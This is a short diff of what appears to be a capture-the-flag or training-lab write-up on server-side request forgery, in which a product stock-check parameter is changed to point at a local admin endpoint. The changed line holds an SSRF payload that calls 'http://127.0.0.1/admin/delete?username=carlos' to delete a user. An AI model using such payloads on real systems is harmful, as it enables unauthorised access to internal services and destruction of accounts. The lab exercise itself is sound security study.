@@ -23,6 +23,6 @@ stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3F
 as we can see in stockapi it sends requst to another host to return stack querey .
 
 let's modify it 
-`stockApi=http://127.0.0.1/admin`
+`stockApi=http://127.0.0.1/admin/delete?username=carlos`
 
 ![image](https://user-images.githubusercontent.com/67979878/128200459-31b390cf-21fa-4b8c-86e6-a15aaa040e48.png)
